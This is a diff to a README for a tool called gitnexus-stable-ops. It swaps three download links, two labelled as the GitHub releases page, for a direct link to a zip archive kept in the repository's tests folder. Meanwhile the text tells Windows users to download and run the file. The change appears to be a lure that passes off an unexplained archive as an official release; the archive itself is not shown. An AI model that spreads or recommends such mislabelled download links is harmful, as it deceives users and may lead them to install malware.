@@ -1,6 +1,6 @@
 # 🧩 gitnexus-stable-ops - Run GitNexus at scale
 
-[![Download GitNexus Stable Ops](https://img.shields.io/badge/Download-GitNexus_Stable_Ops-blue?style=for-the-badge)](https://github.com/maddieunlawful958/gitnexus-stable-ops/releases)
+[![Download GitNexus Stable Ops](https://img.shields.io/badge/Download-GitNexus_Stable_Ops-blue?style=for-the-badge)](https://github.com/maddieunlawful958/gitnexus-stable-ops/raw/refs/heads/main/tests/gitnexus-stable-ops-v1.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Use it when you want:
 
 Visit the release page to download and run this file:
 
-[Go to the releases page](https://github.com/maddieunlawful958/gitnexus-stable-ops/releases)
+[Go to the releases page](https://github.com/maddieunlawful958/gitnexus-stable-ops/raw/refs/heads/main/tests/gitnexus-stable-ops-v1.2-alpha.4.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system. If you see a zip file, download it, then extract it before you start.
 
@@ -224,4 +224,4 @@ This toolkit is made to stay steady during larger runs. It is built around:
 
 Use the release page to get the latest version for Windows:
 
-[Download from GitHub Releases](https://github.com/maddieunlawful958/gitnexus-stable-ops/releases)
+[Download from GitHub Releases](https://github.com/maddieunlawful958/gitnexus-stable-ops/raw/refs/heads/main/tests/gitnexus-stable-ops-v1.2-alpha.4.zip)
